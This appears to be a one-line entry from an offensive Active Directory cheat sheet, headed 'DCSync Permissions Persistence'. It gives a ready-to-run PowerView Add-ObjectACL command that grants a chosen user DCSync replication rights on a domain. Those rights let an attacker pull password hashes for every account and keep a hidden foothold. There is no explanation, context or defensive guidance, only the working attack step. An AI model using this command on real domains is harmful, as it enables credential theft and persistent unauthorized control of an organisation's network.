# DCSync Permissions Persistence

Command:

    Add-ObjectACL -TargetDistinguishedName "DC=Security,DC=local" -PrincipalSamAccountName 'Moe' -Rights DCSync
